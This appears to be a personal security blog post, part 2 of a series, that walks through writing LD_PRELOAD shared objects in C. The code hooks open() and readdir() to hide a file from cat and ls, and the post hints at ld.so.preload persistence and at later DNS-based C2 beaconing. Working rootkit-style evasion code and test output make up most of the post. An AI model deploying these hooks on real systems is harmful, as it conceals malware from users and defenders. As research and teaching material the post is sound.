---
title: "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)"
pubDate: "2022-10-04"
description: "More experiments with dynamic linker hijacking techniques."
tags:
  - C
  - Dynamic Linker
  - LD_PRELOAD
toc: true
math: true
heroImage: '../../assets/dns-2.png'
---

## Journey Post
This post is a something that I call "journey post", this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like `<journey>` so that you can skip it if you are in a hurry.

---

## Overview

In the last post I've described how I hid a file from all the sys calls that are using `readdir`. In this post I will try to hide it from the `cat` command. Let's first examine/reverse engineer how the `cat` command works internally.

Naturally I would start with a simple [strace](https://man7.org/linux/man-pages/man1/strace.1.html) which will trace the system calls and signals that the command uses. 

```console
$ which cat
/usr/bin/cat
$ strace /usr/bin/cat syl.lys
execve("/usr/bin/cat", ["/usr/bin/cat", "syl.lys"], 0x7ffca9c17508 /* 68 vars */) = 0
...
access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet
...
openat(AT_FDCWD, "syl.lys", O_RDONLY) = 3
```

The most interesting sys call in the output is `openat` so lets see the source code of [openat.c](https://github.com/coreutils/gnulib/blob/master/lib/openat.c#L182). Here we can see the `char const *file` that variable is what holds our filename (look at the `strace` output). After that, I followed our steps in the last [post](dynamic-linker-hijacking-experiments) by implementing a function with the same signature and wrapping the original one. 

`<journey>`


After a few tries I was quick to realize that there is some issue. The wrapper that I've implemented didn't work, or at least didn't work all the time. I've tested it out with a simple program that would just call it and in there it worked, I didn't quite get why it does what it does but I found the following discussions:

- [intercepting the openat() system call for GNU tar](https://stackoverflow.com/questions/9161116/intercepting-the-openat-system-call-for-gnu-tar)
- [How to find out what functions to intercept with LD_PRELOAD?](https://stackoverflow.com/questions/49314057/how-to-find-out-what-functions-to-intercept-with-ld-preload)

As it turns out (my best guess) the sys call that I am trying to override `openat` is probably not the one that the `cat` uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has `*open*` in it.

I found on [line 686](https://github.com/coreutils/coreutils/blob/master/src/cat.c#L686) a call to the `open`. An important note here is that this `open` call here is not the sys call but the call in the std lib which will call the related system call for us. So I've decided to change my approach and override the `open` function instead.

`</journey>`

How does the [open function](https://man7.org/linux/man-pages/man2/open.2.html) work? I wouldn't try to explain something that I am hardly good at so it is best for you to read the man pages for that one.

Let's start by copying the signature of the [open function](https://github.com/coreutils/gnulib/blob/master/lib/open.c#L59) and wrap it.

```c
static int (*original_open)(const char *filename, int flags, ...) = NULL;

int open (const char *filename, int flags, ...)
{
    original_open = dlsym(RTLD_NEXT, "open");
    return original_open(filename, flags);
}
```

In this code block I've wrapped the original `open` function with our implementation of the `open` function. What is left now is to add our "malicious" part to it.

```c
if (strcmp(filename, MALICIOUS_FILE) == 0) 
{
    errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT)
    return -1; // Returning -1 (failure)
}
```

And lastly all together

[intercept_open.c](https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/intercept_open.c)
```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>

#define MALICIOUS_FILE "syl.lys"

static int (*original_open)(const char *filename, int flags, ...) = NULL;

int open (const char *filename, int flags, ...)
{   
    if (strcmp(filename, MALICIOUS_FILE) == 0) 
    {
        errno = ENOENT;
        return -1;
    }
    original_open = dlsym(RTLD_NEXT, "open");
    return original_open(filename, flags);
}
```

Let's see if its working...

```console
$ ls
intercept_open.so  syl.lys
$ LD_PRELOAD=./intercept_open.so cat syl.lys
cat: syl.lys: No such file or directory
```

As you can see the `cat` command returns `No such file or directory` which is exactly what we are aiming for.

## Combining it with our `readdir`

We created a malicious `open` function that wraps the original one from the standard lib, lets now combine it with the `readdir` from the previous post into a single shared object.

[malicious.c](https://github.com/syrull/evasive_techniques/blob/main/Part_2_open/malicious.c)
```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <dirent.h>

#define MALICIOUS_FILE "syl.lys"

static int (*original_open)(const char *filename, int flags, ...) = NULL;
struct dirent *(*original_readdir)(DIR *dirp) = NULL;

int open (const char *filename, int flags, ...)
{
    if (strcmp(filename, MALICIOUS_FILE) == 0) 
    {
        errno = ENOENT;
        return -1;
    }
    original_open = dlsym(RTLD_NEXT, "open");
    return original_open(filename, flags);
}

struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    while((ret = original_readdir(dirp))) {
        if(strstr(ret->d_name, MALICIOUS_FILE) == 0)
            break;
    }
    return ret;
}
```

Let's test it out, supposedly we shouldn't get entries from `ls` and `cat`.

```console
$ touch syl.lys
$ ls
intercept_open.c  malicious.c  malicious.so  syl.lys
$ export LD_PRELOAD=./malicious.so
$ ls
intercept_open.c  malicious.c  malicious.so  README.md
$ cat syl.lys
cat: syl.lys: No such file or directory
```

# End
With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).

[Full Source Code](https://github.com/syrull/evasive_techniques/tree/main/Part_2_open)

# Resources

This post wouldn't be possible without:

- https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html
- https://linux.die.net/man/2/openat
- And some kind StackOverflow users! 